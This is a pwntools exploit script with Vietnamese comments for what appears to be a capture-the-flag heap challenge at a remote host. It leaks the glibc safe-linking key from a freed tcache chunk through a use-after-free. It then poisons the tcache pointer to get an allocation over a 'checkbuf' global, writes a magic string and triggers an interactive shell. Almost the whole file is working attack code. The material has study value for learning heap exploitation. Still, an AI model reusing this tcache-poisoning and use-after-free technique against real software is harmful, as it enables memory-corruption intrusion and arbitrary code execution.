from pwn import *

# --- CẤU HÌNH ---
exe = ELF('./heap')
context.binary = exe
# context.log_level = 'debug'

# p = process('./heap')
p = remote('amt.rs', 37557)

# --- HELPER FUNCTIONS ---
def alloc(idx):
    p.sendlineafter(b"> ", b"0")
    p.sendlineafter(b"> ", str(idx).encode())

def free(idx):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())
    # data> 
    p.sendafter(b"data> ", data)

def view(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(idx).encode())
    p.recvuntil(b"data> ")
    # Đọc chính xác số byte malloc (0x67) để tránh bị trôi hoặc thiếu dữ liệu
    data = p.recv(0x67)
    return data

def trigger_check():
    # 0x43 hex = 67 decimal
    p.sendlineafter(b"> ", b"67") 

# 1. Lấy địa chỉ checkbuf
checkbuf_addr = exe.symbols['checkbuf']
log.info(f"Target checkbuf address: {hex(checkbuf_addr)}")

# 2. Alloc chunk 0
log.info("Allocating chunk 0...")
alloc(0)

# 3. Free chunk 0 -> Vào Tcache
log.info("Freeing chunk 0...")
free(0)

# 4. Leak Key (Safe Linking) từ chunk 0 đã free
# Chunk trong tcache chứa: (pos >> 12) ^ next_ptr
# Vì next_ptr = 0 -> Dữ liệu chính là (pos >> 12)
log.info("Leaking Safe Linking Key...")
leak_data = view(0)
heap_key = u64(leak_data[:8].ljust(8, b'\0')) # [:8] để cắt lấy đúng 8 byte
log.info(f"Heap Key leaked: {hex(heap_key)}")

# 5. Tính toán Fake Pointer (Tcache Poisoning)
# Pointer mã hóa = Key ^ Target_Address
fake_fd = heap_key ^ checkbuf_addr
log.info(f"Forged FD Pointer: {hex(fake_fd)}")

# 6. Ghi đè FD của chunk 0 (UAF Write)
log.info("Overwriting FD with fake pointer...")
edit(0, p64(fake_fd))

# 7. Alloc(1): Lấy chunk 0 ra khỏi Tcache
# Lúc này Tcache head sẽ trỏ tới checkbuf_addr
alloc(1)

# 8. Alloc(2): Lấy chunk tiếp theo -> Chính là checkbuf!
log.info("Allocating chunk 2 @ checkbuf...")
alloc(2)

# 9. Ghi chuỗi magic vào checkbuf
magic_string = b"ALL HAIL OUR LORD AND SAVIOR TEEMO"
log.info(f"Writing magic string: {magic_string}")
edit(2, magic_string)

# 10. Kích hoạt shell
log.info("Triggering check()... Enjoy shell!")
trigger_check()

p.interactive()